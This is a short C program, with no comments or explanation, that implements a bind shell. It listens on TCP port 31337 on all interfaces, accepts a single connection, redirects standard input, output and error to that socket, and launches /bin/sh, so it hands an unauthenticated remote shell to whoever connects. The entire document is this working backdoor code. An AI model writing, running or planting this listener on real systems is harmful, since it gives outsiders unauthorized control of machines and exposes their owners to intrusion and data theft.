#include <stdio.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

int sd;
int cli;
struct sockaddr_in servaddr;

int main()
{
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = INADDR_ANY;
  servaddr.sin_port = htons(31337);
  sd = socket(AF_INET, SOCK_STREAM, 0);
  bind(sd, (struct sockaddr *)&servaddr, sizeof(servaddr));
  listen(sd, 1);
  cli = accept(sd, NULL, 0);
  dup2(cli, 0);
  dup2(cli, 1);
  dup2(cli, 2);
  execl("/bin/sh", "sh", NULL);

}
